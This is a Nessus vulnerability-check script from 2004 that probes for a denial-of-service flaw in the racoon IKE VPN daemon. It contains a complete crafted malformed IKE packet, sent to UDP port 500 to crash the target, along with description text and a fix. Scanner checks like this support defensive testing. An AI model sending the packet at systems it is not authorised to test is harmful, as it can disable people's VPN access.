#
# (C) Tenable Network Security 
#
if(description)
{
 script_id(12121);
 script_version("$Revision: 1.5 $");

 name["english"] = "Racoon invalid cookie malloc bug";
 script_name(english:name["english"]);

 desc["english"] = "
The remote system appears to have a problem with processing
invalid requests with invalid cookie values.  At least one
VPN product (racoon) demonstrates this flaw.  Racoon is integrated
with:

FreeBSD 4.0 and beyond 
OpenBSD 2.7 and beyond 
NetBSD  1.5 and beyond 
BSD/OS  4.2 and beyond 

However, the bug has only been verified on FreeBSD systems.

An attacker may use this flaw to disable your VPN remotely.

Solution : If you are running racoon VPN, download and install
the latest SNAP kit from http://www.kame.net.  If you are running
a non-racoon VPN server which is crashing due to this check, consult
your vendor for a fix.

Risk factor : High";

 script_description(english:desc["english"]);

 summary["english"] = "Racoon invalid cookie malloc bug";
 script_summary(english:summary["english"]);

 script_category(ACT_KILL_HOST);

 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 exit(0);
}

# start the script

port=500;

if(!get_udp_port_state(port))
	exit(0);

cookie1 = raw_string(0xFF,0x00,0xFE,0x01,0xFD,0x02,0xFC,0x03);
cookie2 = raw_string(0x4E,0x45,0x53,0x53,0x55,0x53,0x2E,0x2E);

init = raw_string(
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x01,0x10,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x50,0x00,0x00,0x01,0x34,
0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x01,0x28,0x01,0x01,0x00,0x01,
0x03,0x00,0x00,0x24,0x01,0x01,0x00,0x00,0x80,0x01,0x00,0x05,0x80,0x02,0x00,0x02,
0x80,0x03,0x00,0x01,0x80,0x04,0x00,0x02,0x80,0x0B,0x00,0x01,0x00,0x0C,0x00,0x04,
0x00,0x20,0xC4,0x9B,0x03,0x00,0x00,0x24,0x02,0x01,0x00,0x00,0x80,0x01,0x00,0x05,
0x80,0x02,0x00,0x02,0x80,0x03,0x00,0x01,0x80,0x04,0x00,0x02,0x80,0x0B,0x00,0x01,
0x00,0x0C,0x00,0x04,0x00,0x20,0xC4,0x9B,0x03,0x00,0x00,0x24,0x03,0x01,0x00,0x00,
0x80,0x01,0x00,0x05,0x80,0x02,0x00,0x02,0x80,0x03,0x00,0x01,0x80,0x04,0x00,0x02,
0x80,0x0B,0x00,0x01,0x00,0x0C,0x00,0x04,0x00,0x20,0xC4,0x9B,0x03,0x00,0x00,0x24,
0x04,0x01,0x00,0x00,0x80,0x01,0x00,0x05,0x80,0x02,0x00,0x02,0x80,0x03,0x00,0x01,
0x80,0x04,0x00,0x02,0x80,0x0B,0x00,0x01,0x00,0x0C,0x00,0x04,0x00,0x20,0xC4,0x9B,
0x03,0x00,0x00,0x24,0x05,0x01,0x00,0x00,0x80,0x01,0x00,0x05,0x80,0x02,0x00,0x02,
0x80,0x03,0x00,0x01,0x80,0x04,0x00,0x02,0x80,0x0B,0x00,0x01,0x00,0x0C,0x00,0x04,
0x00,0x20,0xC4,0x9B,0x03,0x00,0x00,0x24,0x06,0x01,0x00,0x00,0x80,0x01,0x00,0x05,
0x80,0x02,0x00,0x02,0x80,0x03,0x00,0x01,0x80,0x04,0x00,0x02,0x80,0x0B,0x00,0x01,
0x00,0x0C,0x00,0x04,0x00,0x20,0xC4,0x9B,0x03,0x00,0x00,0x24,0x07,0x01,0x00,0x00,
0x80,0x01,0x00,0x05,0x80,0x02,0x00,0x02,0x80,0x03,0x00,0x01,0x80,0x04,0x00,0x02,
0x80,0x0B,0x00,0x01,0x00,0x0C,0x00,0x04,0x00,0x20,0xC4,0x9B,0x00,0x00,0x00,0x24,
0x08,0x01,0x00,0x00,0x80,0x01,0x00,0x05,0x80,0x02,0x00,0x02,0x80,0x03,0x00,0x01,
0x80,0x04,0x00,0x02,0x80,0x0B,0x00,0x01,0x00,0x0C,0x00,0x04,0x00,0x20,0xC4,0x9B);

# some hosts will not respond to second packet with the same Cookie ID.
init1 = cookie1 + init;
init2 = cookie2 + init;

req=raw_string(
0xFF,0x00,0xFE,0x01,0xFD,0x02,0xFC,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x01,0x00,0x00,0x00,
0x00,0x00,0x00,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0xFF,0xFF,0xFF,0xFF,0xAA,0xAA,0x99,0x88,0x77,0x66,0x55,0x44,0x33,0x22,0x46,
0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,
0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,
0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,
0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,
0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,
0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F,0x4F);


# make sure it's a vpn server by sending a valid IKE packet
soc=open_sock_udp(port);
send(socket:soc, data:init1);
r = recv(socket:soc, length:1024);
if (!r) 
	exit(0);

# send malicious cookie packet
soc2 = open_sock_udp(port);
send(socket:soc2, data:req);
r = recv(socket:soc2, length:1024);

# see if they are still alive
# reuse the original port
send(socket:soc, data:init2);
r = recv(socket:soc, length:1024);
if (!r) 
	security_hole(port:port, proto:"udp"); 


